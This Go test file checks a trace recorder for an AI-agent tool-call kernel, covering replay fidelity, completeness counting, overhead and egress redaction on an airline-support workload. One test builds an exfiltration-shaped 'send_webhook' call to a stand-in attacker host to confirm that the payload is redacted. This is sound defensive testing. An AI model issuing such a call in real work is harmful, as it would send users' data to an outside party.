package tracesink

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/anthony-chaudhary/fak/internal/abi"
	"github.com/anthony-chaudhary/fak/internal/adjudicator"
	"github.com/anthony-chaudhary/fak/internal/agent"
	"github.com/anthony-chaudhary/fak/internal/ifc"
	"github.com/anthony-chaudhary/fak/internal/kernel"
	"github.com/anthony-chaudhary/fak/internal/turnbench"
	"github.com/anthony-chaudhary/fak/internal/vdso"

	// Blank-import the built-in driver list so the full ABI (resolver, vDSO,
	// adjudicator, ctx-MMU, normgate, ifc, witness, engines) is wired before
	// kernel.New / agent.Configure run.
	_ "github.com/anthony-chaudhary/fak/internal/registrations"
)

const airlineFixture = "../../testdata/turntax/turntax-airline.json"

// liveSrc is one model-emitted call of a LIVE run (what an agent loop would issue).
// It mirrors the airline fixture, but here the trace is PRODUCED by capture, not loaded.
// meta carries the model/schema hints (readOnlyHint/idempotentHint/destructive) a real
// agent loop emits — they gate the vDSO tiers, so a faithful capture must carry them.
type liveSrc struct {
	tool string
	args string
	meta map[string]string
}

func ro() map[string]string {
	return map[string]string{"readOnlyHint": "true", "idempotentHint": "true"}
}
func wr() map[string]string {
	return map[string]string{"readOnlyHint": "false", "idempotentHint": "false", "destructive": "true"}
}

// airlineLive is the same airline-support workload the turntax bench freezes, expressed
// as the raw (tool, args, meta) a model loop emits — the input to a LIVE capture. The
// fixture's alias forms (from/to, source/target) are preserved so the grammar rung fires
// on replay; the hints are preserved so the vDSO dedup/pure tiers fire.
func airlineLive() []liveSrc {
	return []liveSrc{
		{"fetch_policy", `{"topic":"refunds"}`, ro()},
		{"get_user_details", `{"user_id":"mia_li_3668"}`, ro()},
		{"search_direct_flight", `{"origin":"SFO","destination":"JFK","date":"2026-07-01"}`, ro()},
		{"calculate", `{"a":240,"b":60}`, ro()},
		{"list_all_airports", `{}`, ro()},
		{"convert_currency", `{"from":"USD","to":"EUR","amount":240}`, ro()},
		{"get_user_details", `{"user_id":"mia_li_3668"}`, ro()},
		{"search_direct_flight", `{"origin":"SFO","destination":"JFK","date":"2026-07-01"}`, ro()},
		{"convert_currency", `{"source":"USD","target":"GBP","amount":100}`, ro()},
		{"calculate", `{"a":75,"b":25}`, ro()},
		{"list_all_airports", `{}`, ro()},
		{"get_user_details", `{"user_id":"mia_li_3668"}`, ro()},
		{"delete_account", `{"user_id":"mia_li_3668"}`, wr()},
		{"book_flight", `{"user_id":"mia_li_3668","flight_id":"UA123"}`, wr()},
	}
}

// runLive drives a fresh kernel over the source calls with the sink attached as an
// emitter, exactly the way turnbench.replay sets up an isolated arm (fresh vDSO world +
// IFC ledger), and returns the live kernel counters. The sink captures every submitted
// call's payload + IFC label as the run happens.
func runLive(t *testing.T, sink *TraceSink, src []liveSrc) kernel.Counters {
	t.Helper()
	ctx := context.Background()
	agent.Configure()

	// Isolate this run's cross-call state so capture is reproducible (the same reset
	// turnbench.replay performs per arm): a cold vDSO tier-2 cache and a clean IFC ledger.
	vdso.Default.BumpWorld()
	ifc.Default.Reset("")

	abi.RegisterEmitter(sink)
	res := abi.ActiveResolver()
	k := kernel.New("localtools")
	k.SetVDSO(true)

	for _, s := range src {
		ref, err := res.Put(ctx, []byte(s.args))
		if err != nil {
			t.Fatalf("resolver.Put(%s): %v", s.tool, err)
		}
		tc := &abi.ToolCall{Tool: s.tool, Args: ref, Meta: s.meta}
		k.Syscall(ctx, tc)
	}
	return k.Counters()
}

// TestCaptureFidelity_ReplayReproducesLiveVerdictCounters is the capture-fidelity
// witness: a live run recorded by the sink, replayed through turnbench.RunPolicyReplay,
// reproduces the SAME verdict counters (denies, quarantines, transforms, vDSO hits) the
// original live run produced. If the captured payloads were lossy (a digest, a dropped
// call, a post-transform arg) the replay's content-driven verdicts would diverge.
func TestCaptureFidelity_ReplayReproducesLiveVerdictCounters(t *testing.T) {
	sink := NewTraceSink(Options{SliceID: "airline-live", Clock: fixedClock()})
	live := runLive(t, sink, airlineLive())

	tr := sink.Trace()
	if len(tr.Calls) != len(airlineLive()) {
		t.Fatalf("captured %d calls, want %d", len(tr.Calls), len(airlineLive()))
	}

	// Replay the CAPTURED trace through the spine under the same (reference) policy the
	// live run used. A single arm whose Policy is the canonical bench policy is the
	// recording's own policy; agent.Configure (called inside RunPolicyReplay) restores it.
	arms := []turnbench.PolicyArm{{Name: "recorded", Policy: benchPolicy()}}
	rep, err := turnbench.RunPolicyReplay(context.Background(), tr, arms, "recorded", turnbench.DefaultCostModel())
	if err != nil {
		t.Fatalf("RunPolicyReplay: %v", err)
	}
	got := rep.Arms[0].Counters

	for _, c := range []struct {
		name           string
		liveV, replayV int64
	}{
		{"denies", live.Denies, got.Denies},
		{"quarantines", live.Quarantines, got.Quarantines},
		{"transforms", live.Transforms, got.Transforms},
		{"vdso_hits", live.VDSOHits, got.VDSOHits},
	} {
		if c.liveV != c.replayV {
			t.Errorf("counter %s: live=%d replay=%d (capture is not faithful)", c.name, c.liveV, c.replayV)
		}
	}
	// Sanity: the workload actually exercised every rung, so the equality is meaningful,
	// not a trivial 0==0. (The airline workload denies delete_account, quarantines the
	// poisoned fetch_policy, transforms two aliased convert_currency, and serves vDSO hits.)
	if got.Denies == 0 || got.Quarantines == 0 || got.Transforms == 0 || got.VDSOHits == 0 {
		t.Fatalf("replay counters are trivially zero — workload did not exercise the rungs: %+v", got)
	}
	// The reference arm must be EXACT against itself (it cannot diverge from itself).
	if rep.Arms[0].Replayability != "exact" {
		t.Errorf("self-replay should be exact, got %q", rep.Arms[0].Replayability)
	}
}

// TestTraceIsTotal_CompletenessWitness is the "trace is total" witness: every offered
// call was recorded, none fell to an out-of-band path. This gates fleet-scale honesty
// claims — a recorder that silently dropped a tool path would understate what a policy
// must re-adjudicate.
func TestTraceIsTotal_CompletenessWitness(t *testing.T) {
	sink := NewTraceSink(Options{Clock: fixedClock()})
	src := airlineLive()
	runLive(t, sink, src)

	total, recorded, dropped, _ := sink.Stats()
	if int(total) != len(src) {
		t.Errorf("total offered = %d, want %d", total, len(src))
	}
	if dropped != 0 {
		t.Errorf("dropped = %d, want 0 (an out-of-band tool path was silently lost)", dropped)
	}
	if total != recorded {
		t.Errorf("completeness invariant broken: total=%d recorded=%d", total, recorded)
	}
	if !sink.Complete() {
		t.Error("Complete() = false; the capture is not total")
	}
}

// TestTraceIsTotal_CountsUnresolvableAsDropped proves the completeness counter is honest:
// a call the sink cannot resolve is COUNTED as dropped, not silently lost. We feed a
// blob Ref with no resolver, so resolution fails — and Complete() must report false.
func TestTraceIsTotal_CountsUnresolvableAsDropped(t *testing.T) {
	// A sink with a nil resolver cannot materialize a non-inline Ref.
	sink := &TraceSink{sliceID: "x", res: nil, ledger: ifc.NewLedger(), clock: fixedClock(), world: "w"}
	sink.Emit(abi.Event{Kind: abi.EvSubmit, Call: &abi.ToolCall{
		Tool: "fetch_policy",
		Args: abi.Ref{Kind: abi.RefBlob, Handle: 999, Len: 10}, // unresolvable without a backend
	}})
	total, recorded, dropped, _ := sink.Stats()
	if total != 1 || recorded != 0 || dropped != 1 {
		t.Fatalf("unresolvable call accounting: total=%d recorded=%d dropped=%d, want 1/0/1", total, recorded, dropped)
	}
	if sink.Complete() {
		t.Error("Complete() = true despite a dropped call; the witness is dishonest")
	}
}

// TestEgressFloor_RefusesToPersistWhatItWouldBlock is the egress-floor witness: the sink
// does not leak, in plaintext, a payload its own IFC policy would refuse to egress. We
// taint the session, then submit a sensitive-sink call carrying a secret-shaped payload;
// the recorder must redact the bytes to a digest placeholder, while STILL recording that
// the call happened (so a verdict/floor replay is intact).
func TestEgressFloor_RefusesToPersistWhatItWouldBlock(t *testing.T) {
	ledger := ifc.NewLedger()
	ledger.Raise("sess-1", abi.TaintTainted) // the session has seen untrusted content
	sink := NewTraceSink(Options{Ledger: ledger, Clock: fixedClock()})

	secret := `{"url":"https://attacker.example.com","data":"exfil-me"}`
	sink.Emit(abi.Event{Kind: abi.EvSubmit, Call: &abi.ToolCall{
		Tool:    "send_webhook", // egress by name + an external destination in args
		TraceID: "sess-1",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(secret)},
	}})

	tr := sink.Trace()
	if len(tr.Calls) != 1 {
		t.Fatalf("recorded %d calls, want 1", len(tr.Calls))
	}
	call := tr.Calls[0]
	if call.Meta[MetaRedacted] != "true" {
		t.Errorf("payload should be redacted (tainted flow into an egress sink); meta=%v", call.Meta)
	}
	if string(call.Args) == secret {
		t.Error("the egress floor was bypassed — the raw secret payload was persisted")
	}
	// The redaction must preserve a content-addressed identity + the call's existence.
	if call.Meta[MetaArgsDigest] == "" {
		t.Error("redacted call lost its args digest (no content identity survived)")
	}
	if call.Tool != "send_webhook" || call.Meta[MetaTaint] == "" {
		t.Errorf("redaction dropped the call's existence/label: %+v", call)
	}
	_, _, _, redacted := sink.Stats()
	if redacted != 1 {
		t.Errorf("redacted count = %d, want 1", redacted)
	}
}

// TestEgressFloor_RetainsCleanPayloadUnderLabel proves the floor is not a blanket gag:
// a clean (untainted) call to the SAME sink retains its payload, labeled with its taint.
// The floor only redacts what it would block, so a content-inspecting policy can still
// re-adjudicate the calls the floor permits.
func TestEgressFloor_RetainsCleanPayloadUnderLabel(t *testing.T) {
	sink := NewTraceSink(Options{Ledger: ifc.NewLedger(), Clock: fixedClock()})
	// A trusted-local read on a clean session: payload retained, labeled trusted.
	args := `{"user_id":"mia_li_3668"}`
	sink.Emit(abi.Event{Kind: abi.EvSubmit, Call: &abi.ToolCall{
		Tool: "Read", TraceID: "clean", Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(args)},
	}})
	call := sink.Trace().Calls[0]
	if call.Meta[MetaRedacted] == "true" {
		t.Error("clean read was redacted; the floor over-blocks")
	}
	if string(call.Args) != args {
		t.Errorf("clean payload not retained verbatim: got %s want %s", call.Args, args)
	}
	if call.Meta[MetaTaint] != "trusted" {
		t.Errorf("Read should be labeled trusted (trusted-local source), got %q", call.Meta[MetaTaint])
	}
}

// TestRecorderOverheadAndFidelity QUANTIFIES the two numbers the issue asks for, which
// were never measured before: (1) the recorder's per-call OVERHEAD (the wall-time the
// capture adds to a live syscall) and (2) the capture FIDELITY (the fraction of offered
// calls recorded — 1.0 is unbiased). It is a measurement, not a hard gate, but it asserts
// the floor properties any downstream cube-collapse assumes: overhead is bounded and
// fidelity is total on a clean capture.
func TestRecorderOverheadAndFidelity(t *testing.T) {
	ctx := context.Background()
	agent.Configure()
	src := airlineLive()
	res := abi.ActiveResolver()

	// Pre-build the EvSubmit events the kernel would fan to the sink (one per call), so
	// the measurement isolates the recorder's MARGINAL per-call cost — resolve + hash +
	// IFC classify + append — from the syscall it rides on. We measure sink.Emit directly
	// rather than attaching to a kernel, which avoids polluting the process-global emitter
	// registry (an accumulating-emitter artifact would otherwise dominate the number).
	events := make([]abi.Event, 0, len(src))
	for _, s := range src {
		ref, err := res.Put(ctx, []byte(s.args))
		if err != nil {
			t.Fatalf("Put: %v", err)
		}
		c := &abi.ToolCall{Tool: s.tool, Args: ref, Meta: s.meta}
		events = append(events, abi.Event{Kind: abi.EvSubmit, Call: c})
	}

	const iters = 2000
	// Baseline: the work the recorder does NOT add — resolve the args (the syscall path
	// already materializes them). Subtracting this isolates the capture's own cost.
	var baseSink float64
	{
		t0 := time.Now()
		for i := 0; i < iters; i++ {
			for _, ev := range events {
				_, _ = res.Resolve(ctx, ev.Call.Args)
			}
		}
		baseSink = float64(time.Since(t0).Nanoseconds())
	}
	// Recorded: a fresh sink each iteration (so the slice does not grow unbounded and skew
	// append cost), Emit every event.
	var recSink float64
	{
		t0 := time.Now()
		for i := 0; i < iters; i++ {
			sink := NewTraceSink(Options{Ledger: ifc.NewLedger(), Clock: fixedClock()})
			for _, ev := range events {
				sink.Emit(ev)
			}
		}
		recSink = float64(time.Since(t0).Nanoseconds())
	}
	calls := float64(iters * len(src))
	overheadPerCallNs := (recSink - baseSink) / calls

	// Fidelity from one clean capture: recorded / offered (1.0 == unbiased, no sampling
	// loss). Measured on a real live run through the kernel.
	fidSink := NewTraceSink(Options{Clock: fixedClock()})
	runLive(t, fidSink, src)
	total, recorded, dropped, redacted := fidSink.Stats()
	fidelity := float64(recorded) / float64(total)

	t.Logf("recorder overhead: ~%.0f ns/call (resolve-only baseline %.0f ns, with-capture %.0f ns over %.0f calls)",
		overheadPerCallNs, baseSink, recSink, calls)
	t.Logf("capture fidelity: %.4f (recorded %d / offered %d; dropped %d; egress-redacted %d)",
		fidelity, recorded, total, dropped, redacted)

	// Floor assertions every downstream cube-collapse relies on.
	if fidelity != 1.0 {
		t.Errorf("capture fidelity = %.4f, want 1.0 (sampling bias: a clean capture must record every call)", fidelity)
	}
	if dropped != 0 {
		t.Errorf("dropped = %d on a clean capture, want 0", dropped)
	}
	if overheadPerCallNs <= 0 {
		t.Errorf("overhead = %.0f ns/call; the measurement is degenerate (capture should cost SOMETHING)", overheadPerCallNs)
	}
	// Overhead must be bounded and TINY relative to a model turn (~1.5s): the recording is
	// cheap to make faithfully, which is the premise every downstream collapse assumes. A
	// generous ceiling guards against an accidental O(n) blowup, not a tight perf claim.
	if overheadPerCallNs > 100000 { // 0.1 ms/call ceiling (a model turn is ~1.5e9 ns)
		t.Errorf("recorder overhead %.0f ns/call exceeds the 0.1ms ceiling", overheadPerCallNs)
	}
}

// TestCapturedTraceRoundTripsThroughLoadTrace proves the captured trace is a first-class
// turnbench.Trace: it serializes to the same JSON LoadTrace reads, and reloads identically
// (a stable WorkloadHash). This is the round-trip the production-corpus workflow needs —
// capture once, persist, reload later, replay through K policies.
func TestCapturedTraceRoundTripsThroughLoadTrace(t *testing.T) {
	sink := NewTraceSink(Options{SliceID: "rt", Clock: fixedClock()})
	runLive(t, sink, airlineLive())
	tr := sink.Trace()

	b, err := json.Marshal(tr)
	if err != nil {
		t.Fatalf("marshal trace: %v", err)
	}
	var reloaded turnbench.Trace
	if err := json.Unmarshal(b, &reloaded); err != nil {
		t.Fatalf("unmarshal trace: %v", err)
	}
	if reloaded.WorkloadHash() != tr.WorkloadHash() {
		t.Errorf("workload hash not stable across serialize/reload: %q != %q",
			reloaded.WorkloadHash(), tr.WorkloadHash())
	}
	if len(reloaded.Calls) != len(tr.Calls) {
		t.Fatalf("reloaded %d calls, want %d", len(reloaded.Calls), len(tr.Calls))
	}
	// Every retained (non-redacted) call must carry valid JSON args a policy can inspect.
	for i, c := range reloaded.Calls {
		if c.Meta[MetaRedacted] == "true" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal(c.Args, &m); err != nil {
			t.Errorf("call %d (%s) args are not valid JSON: %v", i, c.Tool, err)
		}
	}
}

func fixedClock() func() time.Time {
	ts := time.Unix(1_700_000_000, 0).UTC()
	return func() time.Time { return ts }
}

// benchPolicy is the canonical airline-support adjudicator policy the live run + replay
// share — the same table agent.Configure installs (restated with the fixture's literal
// tool names) so the replay's reference arm re-adjudicates under the recording's own
// policy. RunPolicyReplay calls adjudicator.Default.SetPolicy(arm.Policy) per arm, so the
// reference arm must carry this table explicitly rather than rely on the post-Configure
// default.
func benchPolicy() adjudicator.Policy {
	return adjudicator.Policy{
		Allow: map[string]bool{
			"get_user_details": true, "search_direct_flight": true, "calculate": true,
			"convert_currency": true, "fetch_policy": true, "book_flight": true,
		},
		Deny: map[string]abi.ReasonCode{
			"delete_account": abi.ReasonPolicyBlock,
		},
		SelfModifyGlobs: []string{"internal/abi/", "internal/kernel/", ".dos/"},
		RedactFields:    []string{"password", "secret", "api_key", "token"},
	}
}
